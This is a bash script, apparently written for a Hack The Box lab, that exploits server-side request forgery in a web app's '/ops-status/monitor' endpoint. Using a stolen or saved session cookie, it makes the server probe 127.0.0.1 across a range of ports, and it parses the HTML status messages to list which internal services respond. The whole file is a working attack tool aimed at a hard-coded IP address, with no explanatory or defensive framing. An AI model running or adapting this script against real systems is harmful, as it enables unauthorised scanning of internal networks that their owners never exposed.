#!/bin/bash
export MSYS_NO_PATHCONV=1
COOKIE="/c/HTB/43.200.51.235/http/svcm_cookies.txt"
BASE="http://43.200.51.235:8081/ops-status/monitor"

for port in $(seq "$1" "$2"); do
  R=$(curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 4)
  if echo "$R" | grep -q "Connection refused"; then
    :
  else
    MSG=$(echo "$R" | grep -oP '<p class="status-pill status-[a-z]*">\K[^<]*')
    printf 'PORT %s :: %s\n' "$port" "$MSG"
  fi
  sleep 0.15
done
